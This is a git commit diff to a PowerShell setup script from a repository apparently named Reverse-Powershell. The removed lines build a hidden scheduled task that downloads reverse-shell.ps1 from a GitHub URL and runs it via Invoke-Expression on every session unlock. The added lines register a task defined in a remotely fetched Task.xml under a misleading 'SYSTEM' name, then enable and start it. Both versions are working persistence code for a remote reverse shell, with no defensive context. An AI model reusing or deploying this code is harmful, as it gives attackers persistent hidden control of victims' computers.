ae87b6af222687d04cf5fa03077ddd61c7826ff5
RacoonK1ng <nevio09.caputo@icloud.com>
2025-01-19 14:24:34 +0100

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,19 +1,9 @@
-# Define the task action to run the PowerShell script from the URI
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command 'Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/reverse-shell.ps1'' | Invoke-Expression'"
+Register-ScheduledTask -Xml (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/RacoonK1ng/Reverse-Powershell/refs/heads/main/Task.xml").Content -TaskName "SYSTEMexecutionWindowsbullshit" -Force
 
-# Define the task trigger to run when the session is unlocked (combine the two lines into one)
-$trigger = New-ScheduledTaskTrigger -Type SessionStateChange -StateChange "SessionUnlock"
-$trigger.RepetitionInterval = [System.TimeSpan]::FromMinutes(5)  # Repetition every 5 minutes
-$trigger.StopAtDurationEnd = $false
+Enable-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
 
-# Define task settings (similar to those in the XML)
-$settings = New-ScheduledTaskSettingsSet -AllowStartOnDemand $true -StartWhenAvailable $false -RunOnlyIfNetworkAvailable $false -WakeToRun $false -ExecutionTimeLimit (New-TimeSpan -Hours 72)
 
-# Create the scheduled task object
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings
-
-# Register the scheduled task and set it as enabled
-Register-ScheduledTask -TaskName "SYSTEMqoebrt" -InputObject $task -Enabled $true
+Start-ScheduledTask -TaskName "SYSTEMexecutionWindowsbullshit"
 
 
 exit
